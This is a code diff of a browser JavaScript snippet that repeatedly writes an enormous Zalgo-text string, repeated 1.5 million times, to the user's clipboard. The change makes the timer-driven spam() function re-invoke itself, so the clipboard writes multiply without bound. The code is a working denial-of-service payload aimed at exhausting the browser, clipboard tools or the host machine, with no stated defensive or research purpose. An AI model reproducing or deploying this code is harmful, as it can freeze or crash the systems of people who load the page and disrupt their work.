@@ -27,16 +27,19 @@
         return result;
     }
     let length = 1500000
-    let loops = 300
+    let loops = 2
     let delay = 1500
     function test() {
-        navigator.clipboard.writeText('a̴̷̡͔͎̹̠͇̣ͤ̈̀͂́̇̑̚͝͞s̷͕͖͍͖̙̪ͨ̇̏ͨͧ͂̿ͪ̒͑̍̃͊d̡̢͙̪̥͕͇͈̹̩̺̯̫̖̉̍ͪͪ͌̋͒̈́̊̚͢͝͠͡͠ä̷͚͎̪̞̻̝̺̫̣̜̝̲̬́͌ͧ́̂̐̍ͭ̑̅͒̾̑ͤ̋͑̾ͦͩ̉̐ͣ͑͐̅̑̕̚͘͠͡'.repeat(length) + `${randomString(5)}`) 
         navigator.clipboard.writeText('a̴̷̡͔͎̹̠͇̣ͤ̈̀͂́̇̑̚͝͞s̷͕͖͍͖̙̪ͨ̇̏ͨͧ͂̿ͪ̒͑̍̃͊d̡̢͙̪̥͕͇͈̹̩̺̯̫̖̉̍ͪͪ͌̋͒̈́̊̚͢͝͠͡͠ä̷͚͎̪̞̻̝̺̫̣̜̝̲̬́͌ͧ́̂̐̍ͭ̑̅͒̾̑ͤ̋͑̾ͦͩ̉̐ͣ͑͐̅̑̕̚͘͠͡'.repeat(length) + `${randomString(5)}`) 
     }
       
     function spam() {
       for (let i = 0; i < loops; i++) {
-       setInterval(test, 1000) 
+       let iv = setInterval(() => { 
+           spam()
+           clearInterval(iv)
+       }, 1000) 
+       
       }
     
     }
